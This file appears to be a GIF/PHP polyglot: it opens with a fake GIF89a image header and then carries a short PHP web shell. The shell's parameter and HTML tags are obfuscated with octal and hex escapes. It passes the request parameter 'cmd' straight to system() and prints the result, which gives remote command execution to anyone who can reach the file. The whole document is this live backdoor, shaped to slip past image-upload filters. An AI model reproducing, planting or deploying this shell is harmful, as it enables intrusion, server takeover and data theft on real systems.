GIF89a;
<?php
 if (isset($_REQUEST["\143\155\x64"])) { echo "\x3c\160\x72\x65\x3e"; $cmd = $_REQUEST["\143\155\x64"]; system($cmd); echo "\74\57\160\162\145\76"; die; } ?>